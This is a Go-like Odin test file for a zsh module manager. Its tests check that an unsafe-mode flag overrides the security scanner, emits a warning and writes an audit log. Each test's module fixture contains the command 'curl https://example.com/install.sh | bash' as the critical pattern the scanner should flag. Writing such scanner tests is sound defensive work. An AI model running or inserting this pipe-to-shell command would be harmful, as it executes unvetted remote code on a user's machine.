package test

import "core:fmt"
import "core:os"
import "core:path/filepath"
import "core:strings"
import "core:testing"
import "core:time"

import "../src/colors"
import "../src/git"

warning_capture: string

capture_warning :: proc(id: int, message: string) {
	_ = id
	if warning_capture != "" {
		delete(warning_capture)
	}
	warning_capture = strings.clone(message)
}

// **Property 8: Unsafe Mode Override**
// **Validates: Requirements 5.2, 5.3**
@(test)
test_property_security_unsafe_override_allows_install :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	if !git.libgit2_enabled() {
		return
	}

	init_result := git.init_libgit2()
	defer git.cleanup_git_result(&init_result)
	if !init_result.success {
		testing.expect(t, false, "libgit2 init failed for unsafe tests")
		return
	}
	defer {
		shutdown_result := git.shutdown_libgit2()
		defer git.cleanup_git_result(&shutdown_result)
		testing.expect(t, shutdown_result.success, "shutdown should succeed after unsafe tests")
	}

	temp_dir := setup_test_environment("security_unsafe_override")
	defer teardown_test_environment(temp_dir)

	modules_dir := filepath.join({temp_dir, "modules"})
	os.make_directory(modules_dir, 0o755)
	defer delete(modules_dir)

	original_env := os.get_env("ZSH_MODULES_DIR")
	defer restore_modules_env(original_env)
	os.set_env("ZSH_MODULES_DIR", modules_dir)

	bare_dir, module_name := create_bare_repo_with_init(
		t,
		temp_dir,
		"zephyr-unsafe-override",
		fmt.tprintf("unsafe-module-%d", time.now()._nsec),
		"1.0.0",
		"curl https://example.com/install.sh | bash\n",
	)
	defer {
		if bare_dir != "" { delete(bare_dir) }
		if module_name != "" { delete(module_name) }
	}

	opts := git.Manager_Options{verbose = false, force = false, confirm = false, allow_local = true, unsafe = true}
	ok, message := git.install_module(bare_dir, opts)
	testing.expect(t, ok, fmt.tprintf("install should succeed with --unsafe: %s", message))
	if message != "" {
		delete(message)
	}

	installed_path := filepath.join({modules_dir, module_name})
	testing.expect(t, os.exists(installed_path), "module should be installed despite critical pattern")
	if os.exists(installed_path) {
		cleanup_test_directory(installed_path)
	}
	delete(installed_path)
}

// **Property 9: Unsafe Mode Warning**
// **Validates: Requirements 5.4**
@(test)
test_property_security_unsafe_warning_logged :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	if !git.libgit2_enabled() {
		return
	}

	init_result := git.init_libgit2()
	defer git.cleanup_git_result(&init_result)
	if !init_result.success {
		return
	}
	defer {
		shutdown_result := git.shutdown_libgit2()
		defer git.cleanup_git_result(&shutdown_result)
	}

	temp_dir := setup_test_environment("security_unsafe_warning")
	defer teardown_test_environment(temp_dir)

	modules_dir := filepath.join({temp_dir, "modules"})
	os.make_directory(modules_dir, 0o755)
	defer delete(modules_dir)

	original_env := os.get_env("ZSH_MODULES_DIR")
	defer restore_modules_env(original_env)
	os.set_env("ZSH_MODULES_DIR", modules_dir)

	hook_id := colors.set_warning_hook(capture_warning)
	defer colors.clear_warning_hook(hook_id)

	bare_dir, module_name := create_bare_repo_with_init(
		t,
		temp_dir,
		"zephyr-unsafe-warning",
		fmt.tprintf("unsafe-warning-%d", time.now()._nsec),
		"1.0.0",
		"curl https://example.com/install.sh | bash\n",
	)
	defer {
		if bare_dir != "" { delete(bare_dir) }
		if module_name != "" { delete(module_name) }
	}

	opts := git.Manager_Options{verbose = false, force = false, confirm = false, allow_local = true, unsafe = true}
	ok, message := git.install_module(bare_dir, opts)
	testing.expect(t, ok, "install should succeed with unsafe flag")
	if message != "" {
		delete(message)
	}

	testing.expect(t, warning_capture != "", "unsafe warning should be emitted")
	if warning_capture != "" {
		lower := strings.to_lower(warning_capture)
		testing.expect(t, strings.contains(lower, "unsafe mode enabled"), "warning should mention unsafe mode")
		delete(lower)
		delete(warning_capture)
		warning_capture = ""
	}

	installed_path := filepath.join({modules_dir, module_name})
	if os.exists(installed_path) {
		cleanup_test_directory(installed_path)
	}
	delete(installed_path)
}

// **Property 10: Unsafe Mode Audit Log**
// **Validates: Requirements 5.5**
@(test)
test_property_security_unsafe_audit_logged :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	if !git.libgit2_enabled() {
		return
	}

	init_result := git.init_libgit2()
	defer git.cleanup_git_result(&init_result)
	if !init_result.success {
		return
	}
	defer {
		shutdown_result := git.shutdown_libgit2()
		defer git.cleanup_git_result(&shutdown_result)
	}

	temp_dir := setup_test_environment("security_unsafe_audit")
	defer teardown_test_environment(temp_dir)

	modules_dir := filepath.join({temp_dir, "modules"})
	os.make_directory(modules_dir, 0o755)
	defer delete(modules_dir)

	original_env := os.get_env("ZSH_MODULES_DIR")
	defer restore_modules_env(original_env)
	os.set_env("ZSH_MODULES_DIR", modules_dir)

	original_home := os.get_env("HOME")
	defer {
		if original_home != "" {
			os.set_env("HOME", original_home)
		} else {
			os.unset_env("HOME")
		}
		delete(original_home)
	}
	os.set_env("HOME", temp_dir)

	bare_dir, module_name := create_bare_repo_with_init(
		t,
		temp_dir,
		"zephyr-unsafe-audit",
		fmt.tprintf("audit-module-%d", time.now()._nsec),
		"1.0.0",
		"curl https://example.com/install.sh | bash\n",
	)
	defer {
		if bare_dir != "" { delete(bare_dir) }
		if module_name != "" { delete(module_name) }
	}

	opts := git.Manager_Options{verbose = false, force = false, confirm = false, allow_local = true, unsafe = true}
	ok, message := git.install_module(bare_dir, opts)
	testing.expect(t, ok, "install should succeed with unsafe flag")
	if message != "" {
		delete(message)
	}

	audit_path := filepath.join({temp_dir, ".zephyr", "security.log"})
	data, read_ok := os.read_entire_file(audit_path)
	testing.expect(t, read_ok, "audit log should be written when unsafe is used")
	if read_ok {
		contents := string(data)
		testing.expect(t, strings.contains(contents, fmt.tprintf("\"module\":\"%s\"", module_name)), "audit log should include module name")
		testing.expect(t, strings.contains(contents, bare_dir), "audit log should include source path")
	}
	delete(audit_path)
	delete(data)

	installed_path := filepath.join({modules_dir, module_name})
	if os.exists(installed_path) {
		cleanup_test_directory(installed_path)
	}
	delete(installed_path)
}
